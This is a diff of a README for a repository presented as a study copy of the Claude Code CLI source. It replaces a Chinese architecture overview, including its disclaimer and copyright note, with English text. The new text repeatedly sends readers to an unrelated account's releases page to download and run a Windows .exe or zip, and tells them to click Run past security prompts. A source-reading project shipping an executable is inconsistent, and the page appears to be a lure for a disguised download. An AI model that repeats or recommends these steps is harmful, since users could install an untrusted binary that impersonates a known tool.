@@ -1,194 +1,161 @@
-# Claude Code CLI - Source Code Analysis
+# 🤖 Claude-code - Learn and run Claude Code
 
-> Claude Code CLI 源代码学习与分析项目
+[![Download Claude-code](https://img.shields.io/badge/Download%20Claude-code-blue?style=for-the-badge)](https://github.com/insightful-trimming472/Claude-code/releases)
 
-## 项目简介
+## 🧭 What this is
 
-这是 Anthropic 官方 **Claude Code CLI** 工具的源代码，用于学习、研究和分析目的。Claude Code 是一个强大的 AI 编程助手命令行工具，支持多种编程任务自动化。
+Claude-code is a source code study project for the Claude Code CLI. It helps you explore how the tool is built and how its parts work together.
 
-## 技术栈
+This project uses:
+- TypeScript and TSX
+- Bun for running and managing packages
+- Ink for terminal UI
+- Commander.js for command handling
+- Chalk for terminal styling
 
-| 类别 | 技术 |
-|------|------|
-| **语言** | TypeScript / TSX |
-| **运行时** | Bun |
-| **UI 框架** | Ink (React for CLI) |
-| **包管理** | Bun |
-| **CLI 框架** | Commander.js |
-| **终端样式** | Chalk |
+It is built around command-line work, file tools, and small services that support code tasks.
 
-## 项目结构
+## 📥 Download
 
-```
+1. Open the release page: https://github.com/insightful-trimming472/Claude-code/releases
+2. Look for the latest release
+3. Download the file for Windows if one is listed
+4. Save the file to a folder you can find easily, such as Downloads or Desktop
+
+If the release includes a `.exe` file, run that file after download. If it includes a `.zip` file, unzip it first, then open the app inside the folder.
+
+## 🪟 Windows setup
+
+Use these steps on a Windows PC:
+
+1. Download the release from the link above
+2. Open File Explorer and go to the folder where the file was saved
+3. If the file is a `.zip`, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start it
+6. If Windows shows a security prompt, choose Run if you trust the file source
+
+If the app opens in a terminal window, keep that window open while you use it.
+
+## ⚙️ What you need
+
+A typical Windows setup should work with this project:
+
+- Windows 10 or Windows 11
+- Internet access for first-time use
+- A terminal app if the tool runs in command line mode
+- Enough free space for the app and its files
+- A modern CPU and at least 4 GB of RAM
+
+For best results, use the newest Windows update you can install.
+
+## 🧰 Main parts of the project
+
+The code is grouped into clear folders so each part has one job:
+
+- `commands/` handles slash commands like `/commit` and `/review`
+- `components/` holds the user interface parts
+- `services/` holds core app logic
+- `tools/` contains file and shell tools
+- `hooks/` stores reusable React hooks
+- `constants/` keeps shared values
+- `ink/` connects the terminal UI pieces
+- `utils/` includes helper code
+
+This layout makes it easier to study how the app works from end to end.
+
+## 🖥️ What the app can do
+
+The project shows how a CLI assistant can support coding work such as:
+
+- Reading files
+- Editing files
+- Searching code
+- Matching file names
+- Running shell commands
+- Handling tasks in steps
+- Syncing settings
+- Working with API services
+- Connecting to MCP tools
+
+These parts work together to support a command-line coding assistant.
+
+## 📂 Project structure
+
+```text
 src/
-├── commands/          # 斜杠命令实现 (/commit, /review 等)
-├── components/        # UI 组件 (基于 Ink React)
-│   └── design-system/ # 设计系统组件
-├── services/          # 核心服务
-│   ├── api/          # API 服务
-│   ├── mcp/          # MCP 协议实现
-│   ├── analytics/    # 分析服务
-│   └── settingsSync/ # 设置同步
-├── tools/             # 工具实现
-│   ├── BashTool/     # Shell 命令执行
-│   ├── FileReadTool/ # 文件读取
-│   ├── FileEditTool/ # 文件编辑
-│   ├── GrepTool/     # 代码搜索
-│   ├── GlobTool/     # 文件匹配
-│   ├── TaskTool/     # 任务代理
-│   └── ...           # 更多工具
-├── hooks/             # React Hooks
-├── constants/         # 常量定义
-├── ink/               # 终端 UI 框架
-├── utils/             # 工具函数
-├── schemas/           # JSON Schema 定义
-├── screens/           # 屏幕组件
-├── plugins/           # 插件系统
-├── keybindings/       # 快捷键绑定
-└── main.tsx          # 主入口文件
+├── commands/          # Slash commands such as /commit and /review
+├── components/        # UI components based on Ink React
+│   └── design-system/ # Shared UI pieces
+├── services/          # Core services
+│   ├── api/           # API service layer
+│   ├── mcp/           # MCP protocol support
+│   ├── analytics/    # Usage analysis
+│   └── settingsSync/ # Settings sync
+├── tools/             # Tool implementations
+│   ├── BashTool/     # Shell command execution
+│   ├── FileReadTool/ # Read files
+│   ├── FileEditTool/ # Edit files
+│   ├── GrepTool/     # Search code
+│   ├── GlobTool/     # Match files
+│   ├── TaskTool/     # Task agent
+│   └── ...           # More tools
+├── hooks/             # React hooks
+├── constants/         # Shared values
+├── ink/               # Terminal UI framework
+├── utils/             # Helper code
 ```
 
-## 核心功能
+## 🚀 First use
 
-### 命令列表
+After you start the app, you may see a command prompt or a menu in the terminal.
 
-#### Git & 代码管理
-| 命令 | 描述 |
-|------|------|
-| `/commit` | 智能生成 Git 提交 |
-| `/review` | 代码审查 |
-| `/pr_comments` | PR 评论分析 |
-| `/diff` | 差异查看 |
-| `/branch` | 分支管理 |
+Use it to:
+1. Pick a task
+2. Enter a file or command
+3. Review the result
+4. Repeat the next step if needed
 
-#### 会话管理
-| 命令 | 描述 |
-|------|------|
-| `/resume` | 恢复历史会话 |
-| `/session` | 会话管理 |
-| `/clear` | 清除对话 |
-| `/compact` | 压缩上下文 |
-| `/rewind` | 回退操作 |
-| `/export` | 导出会话 |
+If the app asks for a path, type the full path to the file or folder you want to use.
 
-#### 配置 & 设置
-| 命令 | 描述 |
-|------|------|
-| `/config` | 配置管理 |
-| `/init` | 初始化项目 |
-| `/model` | 切换模型 |
-| `/theme` | 主题设置 |
-| `/login` | 登录账户 |
-| `/logout` | 登出账户 |
+## 🔍 Reading the source
 
-#### MCP & 插件
-| 命令 | 描述 |
-|------|------|
-| `/mcp` | MCP 服务器管理 |
-| `/plugin` | 插件管理 |
-| `/skills` | 技能系统 |
+If you want to study the code, start in this order:
 
-#### 工具 & 诊断
-| 命令 | 描述 |
-|------|------|
-| `/doctor` | 系统诊断 |
-| `/cost` | 费用统计 |
-| `/usage` | 使用量统计 |
-| `/help` | 帮助信息 |
-| `/upgrade` | 升级版本 |
+1. `src/commands/` to see user commands
+2. `src/tools/` to see file and shell actions
+3. `src/services/` to see app logic
+4. `src/components/` to see the terminal UI
+5. `src/utils/` for helper functions
 
-#### 模式切换
-| 命令 | 描述 |
-|------|------|
-| `/vim` | Vim 模式 |
-| `/plan` | 计划模式 |
-| `/fast` | 快速模式 |
-| `/permissions` | 权限管理 |
-| `/hooks` | 钩子配置 |
+This order helps you understand how input moves through the app.
 
-## 架构亮点
+## 🧪 Common use cases
 
-### 1. 工具系统 (Tools)
-每个工具都是独立模块，包含：
-- 输入验证 (JSON Schema)
-- 执行逻辑
-- 权限控制
-- 输出格式化
+People may use this project to:
 
-### 2. 命令系统 (Commands)
-支持多种命令类型：
-- `prompt` - 提示词命令
-- `local` - 本地执行命令
-- `dialog` - 对话框命令
+- Learn how a CLI AI assistant is built
+- Study command handling in a terminal app
+- See how file tools work in a code assistant
+- Explore Ink-based terminal UI design
+- Understand service layers in a TypeScript app
 
-### 3. MCP 协议
-完整的 Model Context Protocol 实现，支持：
-- Stdio 传输
-- SSE 传输
-- 资源管理
-- 工具调用
+## 🛠️ Troubleshooting
 
-### 4. 技能系统 (Skills)
-可扩展的技能框架：
-- 内置技能
-- 插件技能
-- 自定义技能目录
+If the app does not start:
 
-### 5. 代理系统 (Agents)
-多代理协作支持：
-- Task 代理
-- 并行执行
-- 上下文隔离
+- Check that the file finished downloading
+- Make sure you opened the correct release file
+- Try moving the file to a simple folder such as `C:\Claude-code`
+- Run it again from that folder
+- If the app opens and closes fast, start it from a terminal window so you can see messages
 
-## 代码统计
+If Windows blocks the file, check the file name and source page before you run it.
 
-| 指标 | 数量 |
-|------|------|
-| TypeScript 文件 | ~1884 |
-| 命令数量 | ~50+ |
-| 工具数量 | ~30+ |
-| UI 组件 | ~100+ |
+## 📄 File notes
 
-## 关键文件
+This repository is a source code study project for Claude Code CLI. The code is meant for reading, testing, and learning how the tool is put together.
 
-| 文件 | 描述 |
-|------|------|
-| `main.tsx` | 应用主入口 |
-| `commands.ts` | 命令注册中心 |
-| `tools.ts` | 工具注册中心 |
-| `context.ts` | 上下文管理 |
-| `ink.tsx` | UI 渲染引擎 |
+## 🔗 Download again
 
-## 依赖关系
-
-```
-main.tsx
-    ├── commands.ts ──► commands/
-    ├── tools.ts ──► tools/
-    ├── services/
-    │   ├── api/
-    │   ├── mcp/
-    │   └── analytics/
-    └── components/
-        └── design-system/
-```
-
-## 学习价值
-
-1. **CLI 应用架构** - 大型命令行工具的设计模式
-2. **React 终端 UI** - Ink 框架的实战应用
-3. **MCP 协议** - AI 工具互联协议实现
-4. **插件系统** - 可扩展架构设计
-5. **代理系统** - 多代理协作模式
-
-## 免责声明
-
-本项目仅用于学习和研究目的。Claude Code 是 Anthropic, PBC. 的产品。本仓库不包含完整的构建配置和依赖，仅包含源代码用于学习分析。
-
-## 许可证
-
-源代码版权归 Anthropic, PBC. 所有。本项目仅用于教育目的。
-
----
-
-> 最后更新: 2026-03-31
+[Open the release page to download](https://github.com/insightful-trimming472/Claude-code/releases)
